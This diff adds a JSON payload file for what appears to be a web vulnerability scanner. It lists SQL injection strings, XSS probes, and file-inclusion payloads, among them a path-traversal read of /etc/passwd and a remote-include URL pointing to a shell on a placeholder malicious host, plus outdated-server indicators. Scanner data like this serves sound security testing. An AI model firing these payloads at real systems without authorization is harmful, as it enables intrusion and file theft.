@@ -1,0 +1,39 @@
+{
+  "sql_injection": {
+    "payloads": [
+      "' OR '1'='1",
+      "' OR '1'='1' --",
+      "' OR '1'='1' /*",
+      "1' ORDER BY 1--",
+      "1' UNION SELECT null, version()--"
+    ],
+    "description": "Tests for SQL injection vulnerabilities by injecting common payloads.",
+    "severity": "high"
+  },
+  "xss": {
+    "payloads": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "javascript:alert('XSS')"
+    ],
+    "description": "Tests for Cross-Site Scripting (XSS) vulnerabilities by injecting script payloads.",
+    "severity": "medium"
+  },
+  "file_inclusion": {
+    "payloads": [
+      "../../../../etc/passwd",
+      "http://malicious.com/shell.php"
+    ],
+    "description": "Tests for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities.",
+    "severity": "high"
+  },
+  "outdated_software": {
+    "indicators": [
+      "Apache/2.2.",
+      "PHP/5.",
+      "nginx/1.14."
+    ],
+    "description": "Checks for outdated software versions in server headers.",
+    "severity": "medium"
+  }
+} 
